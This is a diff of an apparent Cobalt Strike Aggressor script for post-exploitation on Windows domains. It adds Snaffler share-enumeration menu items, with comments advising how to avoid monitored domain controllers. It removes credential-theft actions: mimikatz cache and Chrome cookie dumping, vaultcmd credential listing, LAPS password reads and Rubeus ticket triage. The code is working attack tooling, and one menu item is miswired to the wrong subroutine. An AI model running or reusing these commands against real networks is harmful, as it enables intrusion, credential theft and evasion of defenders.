@@ -278,11 +278,102 @@ menu "ACL Checks"
 }
 #################################################
 
-#   Find Files
+#   File and Share Enumeration
 
 #################################################
-menu "Find Files"
+menu "File And Share Enumeration"
 {
+
+#################################################
+#   Snaffler - SubMenu
+#################################################
+menu "Snaffler"{
+
+
+########################
+#Find All Shares
+########################
+item "Display All Available Shares (Noisy) - T1135"{
+    local('$bid');
+        foreach $bid ($1){
+            findallshares($bid);
+      }
+   }
+
+########################
+#Find Shares - Specify Domain
+########################
+item "Display All Available Shares Based On Domain - T1135"{
+
+    local('$bid');
+        foreach $bid ($1){
+            finddomainshares($bid);
+      }
+   }
+########################
+#Find Shares - Specify DC
+########################
+item "Display All Available Shares Based On DC - T1135"{
+
+    local('$bid');
+        foreach $bid ($1){
+            finddomaincontrollershares($bid);
+      }
+   }
+########################
+#Find Shares - Specify DC & Domain
+########################
+item "Display All Available Shares Based On DC And Domain - T1135"{
+
+    local('$bid');
+        foreach $bid ($1){
+            finddomaincontrolleranddomainshares($bid);
+      }
+   }
+########################
+#Find Shares - User Enumeration All
+########################
+item "Display All Available User Shares (Noisy) - T1135"{
+
+    local('$bid');
+        foreach $bid ($1){
+            finduserallshares($bid);
+      }
+   }
+########################
+#Find Shares - User Enumeration & Specify Domain
+########################
+item "Display All Available User Shares Based On Domain - T1135"{
+
+    local('$bid');
+        foreach $bid ($1){
+            finduserdomainshares($bid);
+      }
+   }
+########################
+#Find Shares - User Enumeration Specify Domain Controller
+########################
+item "Display All User Available Shares Based On Domain Controller - T1135"{
+
+    local('$bid');
+        foreach $bid ($1){
+            finddomaincontrollershares($bid);
+      }
+   }
+########################
+#Find Shares - User Enumeration Specify Domain Controller & Domain
+########################
+item "Display All Available Shares Based On Domain Controller & Domain - T1135"{
+
+    local('$bid');
+        foreach $bid ($1){
+            finduserdomaincontrolleranddomainshares($bid);
+      }
+   }
+} #End Snaffler Menu
+
+
+
 #Find Cloud Credential Files
 item "Find Cloud Creds"{
 	local('$bid');
@@ -452,68 +543,6 @@ item "Service Enumeration - Remote Computer - T1046"{
 
 } #End Menu Popup
 
-#################################################
-
-#   Credentials and Kerberos
-
-#################################################
-menu "Credentials and Kerberos"
-{
-#List Cached Credentials
-item "List Cached Credentials (lsadump::cache)"{
-		local('$bid');
-				foreach $bid ($1){
-					lsadumpcache($bid);
-				}
-			}
-
-#Read LAPS Password
-item "Read LAPS Password"{
-        prompt_text("Computer Name", "", lambda({
-                    bexecute_assembly($bids, script_resource('/exe/SharpView.exe'), "Get-DomainObject -Identity $1 -Properties ms-mcs-admpwd");                
-                }, $bids => $1));
-			}
-			
-#List Current Kerberos Tickets (rubeus triage)			
-item "List Current Kerberos Tickets (rubeus triage)"{
-			local('$bid');
-				foreach $bid ($1){
-					rubeustriage($bid);
-				}
-			}
-
-#List Tokens with MimiKatz
-item "List Tokens with Mimikatz"{
-			local('$bid');
-				foreach $bid ($1){
-					listtokens($bid);
-				}
-			}
-
-#Vaulted Windows Creds		
-item "Vaulted Windows Creds (vaultcmd)"{
-			local('$bid');
-				foreach $bid ($1){
-					windowsvaultcmd($bid);
-				}
-			}
-
-#Vaulted Web Creds			
-item "Vaulted Web Creds (vaultcmd)"{
-			local('$bid');
-				foreach $bid ($1){
-					webvaultcmd($bid);
-				}
-			}
-
-#Chrome Creds			
-item "Steal Chrome Creds (dpapi::chrome)"{
-			local('$bid');
-				foreach $bid ($1){
-					dpapichrome($bid);
-				}
-			}												
-}
 
 
 #################################################
@@ -782,9 +811,85 @@ bexecute_assembly($bids, script_resource('/exe/SharpView.exe'), "Get-ObjectAcl -
 
 #################################################
 
-#   Find Files
+#   File/Share Enumeration
 
 #################################################
+
+
+#################################################
+#   Snaffler
+#################################################
+sub findallshares{
+bexecute_assembly($1, script_resource("/exe/Snaffler.exe"), "-s -j 75 -v data");
+}
+
+sub finddomainshares{
+prompt_text("Insert Domain Name", "", lambda({
+bexecute_assembly($bids, script_resource("/exe/Snaffler.exe"), "-s -j 75 -d $1 -v data");
+}, $bids => $1));
+}
+
+sub finddomaincontrollershares{
+prompt_text("Insert DomainController", "", lambda({
+bexecute_assembly($bids, script_resource("/exe/Snaffler.exe"), "-s -j 75 -c $1 -v data");
+}, $bids => $1));
+}
+
+sub finddomaincontrolleranddomainshares{
+    $bid = $1;
+    $dialog = dialog("Show Domain and DC Shares", %(dom => "", dc => "", execmethod => "Execute-Assembly"), lambda({
+       $cmdargs = "";
+		$cmdargs = "-d $3['dom'] -c $3['dc']";
+        if ($3["execmethod"] eq "Execute-Assembly"){         
+            bexecute_assembly($bid, script_resource('/exe/Snaffler.exe'), '-s -i -j 75 '.$cmdargs.''" -v data");
+        }
+    }));
+    dialog_description($dialog, "Show Domain and DC Shares");
+    drow_text($dialog, "dom",  "Please Enter Domain");
+    drow_text($dialog, "dc",  "Please Enter DC FQDN");
+    dbutton_action($dialog, "Run");
+	dialog_show($dialog);
+}
+
+#prompt_text("Insert Domain Name", "", lambda({
+#bexecute_assembly($bids, script_resource("/exe/Snaffler.exe"), "-s -j 75 -d $1 -v data");
+#}, $bids => $1));
+#}
+
+sub finduserallshares{
+bexecute_assembly($1, script_resource("/exe/Snaffler.exe"), "-s -u -j 75 -v data");
+}
+
+sub finduserdomainshares{
+prompt_text("Insert Domain Name", "", lambda({
+bexecute_assembly($bids, script_resource("/exe/Snaffler.exe"), "-s -u -j 75 -d $1 -v data");
+}, $bids => $1));
+}
+
+sub finduserdomaincontrollershares{
+prompt_text("Insert DomanController", "", lambda({
+bexecute_assembly($bids, script_resource("/exe/Snaffler.exe"), "-s -u -j 75 -c $1 -v data");
+}, $bids => $1));
+}
+
+#sub finddomaincontrolleranddomainshares{
+#prompt_text("Insert Domain Name", "", lambda({
+#bexecute_assembly($bids, script_resource("/exe/Snaffler.exe"), "-s -u -j 75 -d $1 -v data");
+#}, $bids => $1));
+#}
+
+##Share Only Enum
+#"Snaffler.exe -s -j 75 -v data" - Will be at top of menu, this will show all the things and will be noisy
+#Snaffler.exe -s -j 75 -d "$DOMAIN" -v data Will be second item menu, will need to pop up and have user enter domain name
+#Snaffler.exe -s -j 75 -c "$DOMAINCONTROLLER" -v data Specify which domain controller (OPSEC) - try not to hit Azure or ATP DC's - PDC is preferred
+#Snaffler.exe -s -j 75 -c "$DOMAINCONTROLLER" -d "$DOMAIN" -v data Specify which domain controller (OPSEC) and Domain - try not to hit Azure or ATP DC's - PDC is preferred
+##User Enum
+#Snaffler.exe -s -u -j 75-v data" - Will be at top of menu, this will show all the things and will be noisy (Added user switch)
+#Snaffler.exe -s -u -j 75 -d "$DOMAIN" -v data Will be second item menu, will need to pop up and have user enter domain name (Added user switch)
+#Snaffler.exe -s -u -j 75 -c "$DOMAINCONTROLLER" -v data Specify which domain controller (OPSEC) - try not to hit Azure or ATP DC's - PDC is preferred (Added user switch)
+#Snaffler.exe -s -u -j 75 -c "$DOMAINCONTROLLER" -d "$DOMAIN" -v data Specify which domain controller (OPSEC) and Domain - try not to hit Azure or ATP DC's - PDC is preferred (Added user switch)
+
+
 
 # Cloud Creds
 sub cloudcreds{
@@ -898,44 +1003,7 @@ bexecute_assembly($bids, script_resource('/exe/AtYourService.exe'), "$1");
 }, $bids => $1));
 }
 
-#################################################
 
-#   Credentials and Kerberos
-
-#################################################
-#List Cached Credentials
-sub lsadumpcache{
-bmimikatz($1, "lsadump::cache");
-}
-
-#Read LAPS Password
-
-			
-#List Current Kerberos Tickets (rubeus triage)			
-sub rubeustriage{
-bexecute_assembly($1, script_resource('/exe/Rubeus.exe'), "triage");
-}
-
-#List Tokens with MimiKatz
-sub listtokens{
-bmimikatz($1, "token::list");
-}
-
-#Vaulted Windows Creds		
-sub windowsvaultcmd{
-brun($1, 'vaultcmd.exe /listcreds:"Windows Credentials" /all');
-}
-
-#Vaulted Web Creds			
-#Steal Web Credentials from Vault
-sub webvaultcmd{
-brun($1, 'vaultcmd.exe /listcreds:"Web Credentials" /all');
-}
-
-#Chrome Creds			
-sub dpapichrome{
-bmimikatz($1, "dpapi::chrome /in:”%localappdata%\Google\Chrome\User Data\Default\Cookies");
-}	
 
 #################################################
 
